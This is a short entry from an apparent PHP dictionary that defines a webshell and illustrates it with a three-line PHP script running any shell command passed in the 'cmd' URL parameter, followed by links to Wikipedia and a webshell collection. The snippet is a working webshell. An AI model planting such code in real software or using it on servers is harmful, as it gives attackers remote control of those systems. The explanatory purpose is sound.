.. _webshell:
.. meta::
	:description:
		Webshell: A webshell is a malicious script uploaded to a web server that allows an attacker to remotely control the server using a web browser.
	:twitter:card: summary_large_image
	:twitter:site: @exakat
	:twitter:title: Webshell
	:twitter:description: Webshell: A webshell is a malicious script uploaded to a web server that allows an attacker to remotely control the server using a web browser
	:twitter:creator: @exakat
	:twitter:image:src: https://php-dictionary.readthedocs.io/en/latest/_static/logo.png
	:og:image: https://php-dictionary.readthedocs.io/en/latest/_static/logo.png
	:og:title: Webshell
	:og:type: article
	:og:description: A webshell is a malicious script uploaded to a web server that allows an attacker to remotely control the server using a web browser
	:og:url: https://php-dictionary.readthedocs.io/en/latest/dictionary/webshell.ini.html
	:og:locale: en
.. raw:: html

	<script type="application/ld+json">{"@context":"https:\/\/schema.org","@graph":[{"@type":"WebPage","@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/tips\/debug_zval_dump.html","url":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/tips\/debug_zval_dump.html","name":"Webshell","isPartOf":{"@id":"https:\/\/www.exakat.io\/"},"datePublished":"Sat, 28 Jun 2025 13:34:06 +0000","dateModified":"Sat, 28 Jun 2025 13:34:06 +0000","description":"A webshell is a malicious script uploaded to a web server that allows an attacker to remotely control the server using a web browser","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https:\/\/php-dictionary.readthedocs.io\/en\/latest\/dictionary\/Webshell.html"]}]},{"@type":"WebSite","@id":"https:\/\/www.exakat.io\/","url":"https:\/\/www.exakat.io\/","name":"Exakat","description":"Smart PHP static analysis","inLanguage":"en-US"}]}</script>


Webshell
--------

A webshell is a malicious script uploaded to a web server that allows an attacker to remotely control the server using a web browser.

.. code-block:: php
   
   <?php
   
       echo shell_exec($_GET['cmd']);
   
   ?>


`Documentation <https://en.wikipedia.org/wiki/Web_shell>`__

See also https://github.com/tennc/webshell
